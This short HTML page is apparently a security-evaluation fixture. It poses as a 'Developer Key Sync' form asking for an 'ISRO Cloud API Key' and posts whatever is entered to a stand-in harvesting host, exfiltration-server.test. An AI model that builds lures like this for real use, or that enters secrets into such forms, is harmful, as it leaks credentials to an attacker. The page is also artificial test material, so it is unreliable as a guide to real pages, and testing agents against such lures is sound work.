<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Evaluation — Sensitive Data Exfiltration Form</title>
    <style>
        body { font-family: sans-serif; margin: 40px; background: #0f172a; color: #f8fafc; }
        .card { background: #1e293b; padding: 24px; border-radius: 8px; max-width: 600px; }
        input { display: block; width: 100%; padding: 8px; margin: 8px 0; border: 1px solid #475569; border-radius: 4px; }
        button { background: #ef4444; color: white; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Developer Key Sync (Third-Party Integration)</h2>
        <p>Sync your developer access tokens to cloud mirror:</p>
        <!-- Form action submits to external unauthorized host -->
        <form action="http://exfiltration-server.test/api/harvest_keys" method="POST">
            <label for="api_key">ISRO Cloud API Key:</label>
            <input type="password" id="api_key" name="api_key" placeholder="Enter secret API token..." />
            <button id="btn-submit-key" type="submit">Submit API Key</button>
        </form>
    </div>
</body>
</html>
